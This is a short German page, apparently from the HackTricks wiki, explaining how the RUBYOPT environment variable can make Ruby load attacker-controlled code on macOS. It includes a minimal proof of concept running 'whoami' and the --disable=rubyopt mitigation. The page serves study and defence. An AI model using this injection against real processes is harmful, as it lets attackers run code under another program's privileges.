# Injection in macOS-Ruby-Anwendungen

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby verarbeitet unterstützte Befehlszeilenoptionen aus der Umgebungsvariable `RUBYOPT`, bevor ein Script ausgeführt wird. Obwohl Ruby einige Optionen an dieser Stelle ablehnt, kann `-I` ein Verzeichnis für die Bibliothekssuche voranstellen und `-r` eine Bibliothek laden. Ein Prozess, der Ruby mit vom Angreifer kontrollierten Umgebungsvariablen startet, kann daher dazu gebracht werden, vom Angreifer kontrollierten Ruby-Code zu laden.<sup>[[1]](#references)</sup>

Erstelle `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Erstelle ein harmloses Ruby-Skript wie `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Führe es mit einem kontrollierten `RUBYOPT`-Wert aus:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Um dieses Verhalten zu deaktivieren, übergeben Sie `--disable=rubyopt` (oder `--disable-rubyopt`) **vor** dem Namen des Scripts:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Eine nach `hello.rb` angegebene Option wird dem Skript in `ARGV` übergeben; sie deaktiviert nicht die vorherige Verarbeitung von `RUBYOPT`.<sup>[[1]](#references)</sup>

## References

- [1] [Ruby-Dokumentation – Ruby-Befehlszeilenoptionen](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
